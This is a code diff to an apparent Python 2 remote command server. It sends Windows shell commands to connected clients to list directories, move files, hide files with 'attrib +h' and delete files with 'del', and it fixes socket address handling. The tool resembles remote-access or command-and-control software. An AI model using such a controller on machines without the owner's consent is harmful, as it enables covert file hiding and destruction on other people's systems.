@@ -86,9 +86,9 @@ def handle_request(data, open_client_sockets=[], current_socket=None):
         if d.WhichOneof("Msg") == "clientReq":
             if d.clientReq.WhichOneof("Type") == 'clientStart':
                 for soc in open_client_sockets:
-                    if soc.getsockname()[0] == d.clientReq.clientStart.ip and soc.getsockname()[1] \
+                    print soc.getpeername()
+                    if soc.getpeername()[0] == d.clientReq.clientStart.ip and soc.getpeername()[1] \
                             not in [d.clientReq.clientStart.port, PORT]:
-                        pass
                         print "goodbye ", soc.getsockname()
                         d1 = data_pb2.TData()
                         d1.serverReq.id = random.randint(1, MAX_RANDOM)
@@ -99,10 +99,6 @@ def handle_request(data, open_client_sockets=[], current_socket=None):
             if d.clientRsp.WhichOneof("Type") == 'cmdCommandResult':
                 print "result", d.clientRsp.cmdCommandResult.result
 
-                # else:
-                #     for soc in open_client_sockets:
-                #         if soc != current_socket:
-                #             messages_to_send.append((soc, data))
     except Exception as e:
         print e.message
 
@@ -141,14 +137,14 @@ def send_message(msg, open_client_sockets=None, wlist=None):
         send_command("cd " + raw_input("enter directory: ") + " & dir", open_client_sockets, wlist)
     elif msg.startswith('6'):
         print "move"
-        send_command("move " + raw_input("enter src_file: ") + raw_input("enter dst_file: "), open_client_sockets,
+        send_command("move " + raw_input("enter src_file: ")+" " + raw_input("enter dst_file: "), open_client_sockets,
                      wlist)
     elif msg.startswith('7'):
         print "hidden"
         send_command("attrib +h " + raw_input("enter file path & name: "), open_client_sockets, wlist)
     elif msg.startswith('8'):
         print "remove"
-        send_command("del " + raw_input("enter file path & name: ") + " & dir", open_client_sockets, wlist)
+        send_command("del " + raw_input("enter file path & name: ") , open_client_sockets, wlist)
 
 
 def main():
